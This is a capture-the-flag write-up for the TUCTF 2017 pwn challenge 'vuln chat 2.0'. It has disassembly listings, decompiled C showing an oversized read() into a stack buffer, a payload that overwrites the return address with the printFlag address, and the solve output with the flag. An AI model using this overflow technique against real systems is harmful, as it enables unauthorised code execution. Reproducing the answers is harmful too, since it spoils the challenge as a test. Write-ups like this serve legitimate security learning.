# vuln chat 2.0
100 point  
  
Djinn has got some new intel for us. And I think he's giving us a second chance. But he will only speak with you. Let's see what he's got to say.  
  
nc vulnchat2.tuctf.com 4242  
  
[vuln-chat2.0](https://github.com/j3rrry/CTF/raw/master/2017/TU/Pwn/vuln%20chat%202.0/vuln-chat2.0) - md5: d0fe412783aaaeeddc2a6504d6dff631  
libc.so.6 - md5: f71e966c590bfb1f53ea3410f8b489d4  

```radare
[0x08048460]> iz
vaddr=0x08048750 paddr=0x00000750 ordinal=000 sz=50 len=49 section=.rodata type=ascii string=----------- Welcome to vuln-chat2.0 -------------
vaddr=0x08048782 paddr=0x00000782 ordinal=001 sz=22 len=21 section=.rodata type=ascii string=Enter your username:
vaddr=0x08048798 paddr=0x00000798 ordinal=002 sz=5 len=4 section=.rodata type=ascii string=%15s
vaddr=0x0804879d paddr=0x0000079d ordinal=003 sz=13 len=12 section=.rodata type=ascii string=Welcome %s!\n
vaddr=0x080487aa paddr=0x000007aa ordinal=004 sz=22 len=21 section=.rodata type=ascii string=Connecting to 'djinn'
vaddr=0x080487c0 paddr=0x000007c0 ordinal=005 sz=37 len=36 section=.rodata type=ascii string=--- 'djinn' has joined your chat ---
vaddr=0x080487e8 paddr=0x000007e8 ordinal=006 sz=67 len=66 section=.rodata type=ascii string=djinn: You've proven yourself to me. What information do you need?
vaddr=0x0804882b paddr=0x0000082b ordinal=007 sz=5 len=4 section=.rodata type=ascii string=%s:
vaddr=0x08048830 paddr=0x00000830 ordinal=008 sz=32 len=31 section=.rodata type=ascii string=djinn: Alright here's you flag:
vaddr=0x08048850 paddr=0x00000850 ordinal=009 sz=30 len=29 section=.rodata type=ascii string=djinn: flag{1_l0v3_l337_73x7}
vaddr=0x08048870 paddr=0x00000870 ordinal=010 sz=31 len=30 section=.rodata type=ascii string=djinn: Wait thats not right...
vaddr=0x0804888f paddr=0x0000088f ordinal=011 sz=13 len=12 section=.rodata type=ascii string=Ah! Found it
vaddr=0x0804889c paddr=0x0000089c ordinal=012 sz=20 len=19 section=.rodata type=ascii string=/bin/cat ./flag.txt
vaddr=0x080488b0 paddr=0x000008b0 ordinal=013 sz=35 len=34 section=.rodata type=ascii string=Don't let anyone get ahold of this
```
```radare
[0x08048460]> afl~printFlag
0x08048672    1 65           sym.printFlag
```
```C
int doThings()
{
  char buf; // [sp+1h] [bp-27h]@1
  char v2; // [sp+15h] [bp-13h]@1

  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf("%15s", &v2);
  printf("Welcome %s!\n", &v2);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: You've proven yourself to me. What information do you need?");
  printf("%s: ", &v2);
  read(0, &buf, 0x2Du);
  puts("djinn: Alright here's you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  return puts("djinn: Wait thats not right...");
}
```
`char buf; // [sp+1h] [bp-27h]@1`  
`read(0, &buf, 0x2Du);`  
`payload = "1" * (0x27 + 4) + printFlag()`  
```shell
# python solve.py
[+] Opening connection to vulnchat2.tuctf.com on port 4242: Done
[*] Switching to interactive mode
djinn: Alright here's you flag:
djinn: flag{1_l0v3_l337_73x7}
djinn: Wait thats not right...
Ah! Found it
TUCTF{0n3_by73_15_4ll_y0u_n33d}
Don't let anyone get ahold of this
[*] Got EOF while reading in interactive
$
```
